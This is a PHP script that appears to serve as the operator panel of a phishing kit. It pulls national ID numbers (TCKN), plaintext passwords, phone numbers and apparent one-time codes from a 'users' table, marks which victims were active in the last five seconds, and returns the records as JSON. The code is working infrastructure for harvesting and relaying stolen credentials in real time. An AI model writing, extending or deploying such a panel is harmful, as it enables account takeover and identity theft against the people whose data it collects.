<?php
include '../config.php';

$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$limit = 7;
$offset = ($page - 1) * $limit;

$sql = "SELECT id, txtTCKN, txtPassword, txtPhone, txtCode, status, 
        IF(TIMESTAMPDIFF(SECOND, FROM_UNIXTIME(last_activity), NOW()) > 5, 'Offline', 'Online') as is_online 
        FROM users 
        WHERE txtTCKN IS NOT NULL AND txtTCKN != '' 
          AND txtPassword IS NOT NULL AND txtPassword != '' 
        ORDER BY id DESC 
        LIMIT $limit OFFSET $offset";
$result = $conn->query($sql);

$users = [];
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        $users[] = $row;
    }
}

$sql_total = "SELECT COUNT(*) as total 
              FROM users 
              WHERE txtTCKN IS NOT NULL AND txtTCKN != '' 
                AND txtPassword IS NOT NULL AND txtPassword != ''";
$result_total = $conn->query($sql_total);
$total = $result_total->fetch_assoc()['total'];

$conn->close();

echo json_encode([
    'total' => $total,
    'data' => $users
]);
?>
